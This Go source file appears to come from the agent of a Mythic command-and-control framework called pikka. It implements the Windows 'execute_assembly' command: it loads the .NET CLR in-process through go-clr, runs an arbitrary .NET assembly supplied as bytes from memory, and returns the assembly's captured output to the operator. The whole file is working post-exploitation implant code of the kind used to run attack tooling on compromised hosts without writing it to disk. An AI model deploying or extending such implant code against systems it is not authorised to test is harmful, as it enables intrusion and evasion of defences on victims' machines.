//go:build windows

package execute_assembly

import (
	// Standard

	"fmt"

	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/pkg/utils"

	clr "github.com/Ne0nd0g/go-clr"
)

// Known limitation: go-clr LoadCLR may fail on the first invocation per process lifetime.
// If CLR loading fails, retry the command - disabled for debugging.
func executeAssembly(exebytes []byte, args []string) (string, string) {

	err := clr.RedirectStdoutStderr()
	if err != nil {
		return "", fmt.Sprintf("Error redirecting stdout/stderr: %s", err)
	}

	utils.PrintDebug("Loading CLR")
	runtimeHost, err := clr.LoadCLR("v4")
	if err != nil {
		return "", fmt.Sprintf("error loading CLR: %s", err)
	}

	utils.PrintDebug("Loading assembly")
	methodInfo, err := clr.LoadAssembly(runtimeHost, exebytes)
	if err != nil {
		return "", fmt.Sprintf("error loading assembly: %s", err)
	}

	utils.PrintDebug("Invoking assembly")
	stdout, stderr := clr.InvokeAssembly(methodInfo, args)
	utils.PrintDebug("STDOUT: " + stdout)

	return stdout, stderr
}
